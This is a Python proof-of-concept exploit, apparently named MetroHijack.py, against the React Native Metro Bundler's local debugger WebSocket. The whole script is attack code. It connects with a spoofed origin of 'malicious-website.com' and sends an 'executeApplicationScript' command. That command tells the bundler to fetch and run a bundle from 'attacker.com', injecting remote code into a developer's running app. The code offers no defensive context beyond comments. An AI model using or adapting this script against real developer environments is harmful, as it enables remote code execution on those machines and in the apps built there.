# PoC: MetroHijack.py
import websocket # pip install websocket-client
import json
import threading
import time

# Target: The running Metro Bundler on Developer's machine
METRO_URL = "ws://localhost:8081/message?role=debugger&name=Chrome"

def on_message(ws, message):
    print(f"[+] Received from Metro: {message[:100]}...")
    # If we receive a response, it means connection was successful
    ws.close()

def on_error(ws, error):
    print(f"[-] Error: {error}")

def on_open(ws):
    print("[*] Connected to Metro Bundler!")

    # 1. Attempt to Inject Code
    payload = {
        "method": "executeApplicationScript",
        "url": "http://attacker.com/malicious.bundle",
        "inject": True
    }

    print("[*] Sending Malicious Payload...")
    try:
        ws.send(json.dumps(payload))
        print("[*] Payload sent successfully")
    except Exception as e:
        print(f"[-] Failed to send payload: {e}")

    # Close after a short delay
    def close_ws():
        time.sleep(2)
        ws.close()

    threading.Thread(target=close_ws).start()

def run_exploit():
    # Simulate a browser connection with a distinct Origin
    # If Metro accepts this, it's vulnerable to CSRF
    # Note: websocket-client handles headers via header param in init, not run_forever
    headers = {
        "Origin": "http://malicious-website.com"
    }

    print(f"[*] Connecting to {METRO_URL} with Origin: {headers['Origin']}")

    ws = websocket.WebSocketApp(METRO_URL,
                                header=headers,
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error)
    ws.run_forever()

if __name__ == "__main__":
    run_exploit()
